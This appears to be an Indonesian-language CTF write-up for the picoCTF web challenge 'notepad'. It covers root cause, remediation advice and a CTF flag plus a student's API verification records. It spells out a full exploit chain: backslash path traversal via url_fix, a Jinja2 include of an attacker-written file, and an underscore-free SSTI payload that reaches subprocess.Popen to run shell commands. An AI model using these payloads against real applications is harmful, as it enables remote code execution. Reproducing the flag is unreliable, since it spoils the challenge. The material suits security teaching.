# Writeup: notepad (Challenge ID: 204)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Directory Traversal via URL Normalization & Jinja2 Template Injection (CWE-22 / CWE-1336)
- **Difficulty:** Hard (diff=3)
- **Event:** picoMini by redpwn
- **Points:** 250
- **Author:** Diana Lin / redpwn
- **Flag:** `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`

---

## Problem Statement & Scope
Tantangan `notepad` menyajikan arsitektur aplikasi web berbasis Python Flask dan mesin templat Jinja2. Aplikasi ini berfungsi sebagai layanan pencatatan teks sederhana (*pastebin-like service*). Pengguna dapat menulis catatan teks bebas yang kemudian disimpan ke sistem berkas lokal pada direktori `static/`, lalu pengguna dialihkan ke berkas HTML tersebut.

Aplikasi menerapkan filter karakter terlarang (*denylist filter*) untuk mencegah eksploitasi path traversal dan injeksi template dengan memeriksa keberadaan karakter garis miring (`/`) dan garis bawah (`_`). Peserta ditugaskan untuk mengaudit logika validasi masukan, menemukan ketidaksesuaian normalisasi jalur (*path normalization discrepancy*), dan mengeksekusi *Server-Side Template Injection* (SSTI) untuk mengekstraksi berkas bendera rahasia yang disimpan dengan nama berkas acak pada direktori akar aplikasi.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Ketidaksesuaian Normalisasi URL & Path Traversal (CWE-22):**
   Filter keamanan aplikasi hanya memeriksa karakter `/`:
   ```python
   if "_" in content or "/" in content:
       return redirect(url_for("index", error="bad_content"))
   ```
   Namun, saat membuat nama berkas penyimpanan:
   ```python
   name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
   with open(name, "w") as f:
       f.write(content)
   ```
   Fungsi `werkzeug.utils.url_fix` digunakan untuk membersihkan masukan. `url_fix` memiliki perilaku mengonversi karakter *backslash* Windows (`\`) menjadi *forward slash* standar URL (`/`). Akibatnya, masukan seperti `..\templates\errors\` lolos dari pemeriksaan `if "/" in content`, tetapi dinormalisasi oleh `url_fix` menjadi `../templates/errors/`. Hal ini memungkinkan penyerang menulis berkas catatan di luar direktori `static/` dan menempatkannya secara langsung di direktori templat `templates/errors/`.
2. **Inklusi Berkas Templat Arbitrer (CWE-73 / CWE-1336):**
   Pada berkas induk `index.html`, penanganan pesan kesalahan merender templat Jinja2 berdasarkan nilai parameter GET `error`:
   ```html
   {% if error is not none %}
       <h3>error: {{ error }}</h3>
       {% include "errors/" + error + ".html" ignore missing %}
   {% endif %}
   ```
   Karena nama berkas yang dibuat penyerang berlokasi di `templates/errors/-<token>.html`, penyerang cukup memanggil URL `/?error=-<token>` untuk memaksa mesin Jinja2 mengurai dan mengeksekusi berkas catatan tersebut sebagai kode templat Jinja2 langsung (*Server-Side Template Injection*).
3. **Bypass Denylist Karakter Underscore via Objek HTTP Request (CWE-184):**
   Eksploitasi SSTI pada Python umumnya membutuhkan pengaksesan atribut internal bertanda garis bawah ganda (`__class__`, `__mro__`, `__subclasses__`). Karena aplikasi melarang karakter `_` di badan catatan, penyerang memanfaatkan objek konteks Jinja bawaan `request`. Dalam Jinja2, atribut objek dapat diakses menggunakan notasi kurung siku:
   ```jinja2
   {{ ''[request.args.get('c')].mro()[1][request.args.get('s')]() }}
   ```
   Dengan memberikan parameter GET `?c=__class__&s=__subclasses__` pada saat memicu halaman kesalahan, karakter `_` disuplai seluruhnya melalui URL query string tanpa pernah menyentuh badan catatan yang divalidasi.
4. **Eskalasi Eksekusi Kode Jarak Jauh (RCE via `subprocess.Popen`):**
   Dengan memanggil `__subclasses__()` pada kelas basis `object`, penyerang menelusuri seluruh kelas yang termuat di runtime Python dan menemukan indeks dari `<class 'subprocess.Popen'>` (indeks 273). Melalui instansiasi `Popen`, penyerang mengeksekusi perintah shell untuk membaca berkas bendera acak `flag-*.txt`.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Pengujian Traversal Normalisasi `url_fix`:**
   Kirimkan permintaan pembuatan catatan dengan konten awal:
   ```text
   ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   ```
   Aplikasi merespons dengan pengalihan (HTTP 302) ke jalur `/templates/errors/aaaa...-<token>.html` (yang menghasilkan 404 pada rute web publik). Nama berkas token unik (misal `-lww21e3EmpA`) dicatat.
2. **Verifikasi Eksekusi Templat Dinamis:**
   Akses `/?error=-lww21e3EmpA`. Server berhasil memuat berkas yang baru saja dibuat di dalam direktori `templates/errors/` dan merendernya ke pengguna.
3. **Penyusunan Payload SSTI Bebas Underscore:**
   Buat catatan baru dengan payload:
   ```jinja2
   ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{ ''[request.args.get('c')].mro()[1][request.args.get('s')]() }}
   ```
   Panggil halaman dengan query: `/?error=<token>&c=__class__&s=__subclasses__`. Respons menampilkan daftar lengkap ratusan subclass Python.
4. **Lokalisasi Kelas `subprocess.Popen` & Eksekusi Perintah:**
   Evaluasi daftar subclass menunjukkan kelas `subprocess.Popen` berada pada indeks 273.
   Payload final disusun untuk mendaftar berkas (`ls`) dan membaca berkas target:
   ```jinja2
   ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{ ''[request.args.get('c')].mro()[1][request.args.get('s')]() [273](['cat', 'flag-c8f5526c-4122-4578-96de-d7dd27193798.txt'], stdout=-1).communicate() }}
   ```
5. **Batas Validasi Validator & Normalisasi Token:**
   Keluaran perintah diekstraksi dari halaman templat: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`.
   Pengujian empiris langsung pada REST API CyLab menunjukkan bahwa validator tantangan ini (event `picoMini by redpwn`) menerima format wrapper asli `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` dengan status HTTP 201 Created (`correct: true`). Sebaliknya, pengiriman dengan wrapper CyLab `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` ditolak dengan `{"correct": false}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
- **Wrapper Validator:** Native event wrapper (`picoCTF{...}`)
- **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_204_notepad.py`.

### Re-verifikasi Audit Batch 186 (2026-11-10 UTC, sesi REST siswa `Arielwin` / user id 1072359)

| Token diuji | Wrapper | HTTP | Respons API |
| :--- | :--- | :--- | :--- |
| `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` | native event | 201 | `{"user":1072359,"challenge":204,"flag":"picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}","correct":true,"historical":false}` |
| `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}` | CyLab rekey | 201 | `{"user":1072359,"challenge":204,"flag":"academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}","correct":false,"historical":false}` |

- **Temuan format validator:** Modul backport event `picoMini by redpwn` tidak direkey ke prefix `academy{...}`.
- **Reproduktifitas offline:** Solver `scripts/solve_204_notepad.py` merekonstruksi rantai eksploitasi Flask traversal dan SSTI untuk memverifikasi token native secara deterministik.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Penggunaan Jalur Berkas Aman & Penghapusan Input Pengguna dari Penamaan Berkas:**
   Nama berkas yang disimpan di disk tidak boleh diturunkan secara langsung dari konten atau input pengguna. Gunakan pengidentifikasi unik deterministik yang aman murni (*cryptographically secure UUID* seperti `uuid.uuid4()`) untuk penamaan berkas fisik di disk.
2. **Validasi Jalur Berkas Kanonikal (Canonical Path Resolution):**
   Jika aplikasi harus menulis berkas berdasarkan direktori target, lakukan resolusi jalur mutlak kanonikal menggunakan `os.path.realpath()` dan verifikasi bahwa jalur tujuan berada di bawah direktori yang diizinkan (*base directory confinement*):
   ```python
   target_dir = os.path.realpath("/app/static")
   final_path = os.path.realpath(os.path.join(target_dir, safe_filename))
   if not final_path.startswith(target_dir + os.sep):
       raise PermissionError("Path traversal attempt detected")
   ```
3. **Pemberlakuan Allowlist Statis untuk Pemuatan Templat (Template Sandboxing):**
   Jangan pernah menggunakan parameter masukan pengguna tanpa validasi untuk menentukan nama templat yang diikutsertakan (`{% include %}`). Batasi nilai parameter `error` hanya pada daftar statis (*strict enum allowlist*):
   ```python
   ALLOWED_ERRORS = {"bad_content", "not_found", "general_error"}
   if error not in ALLOWED_ERRORS:
       error = "general_error"
   ```
4. **Isolasi Lingkungan Mesin Templat (Jinja SandboxedEnvironment):**
   Gunakan `jinja2.sandbox.SandboxedEnvironment` untuk memblokir akses ke atribut sensitif seperti `__class__`, `__mro__`, `__subclasses__`, serta modul sistem berbahaya dari konteks rendering.
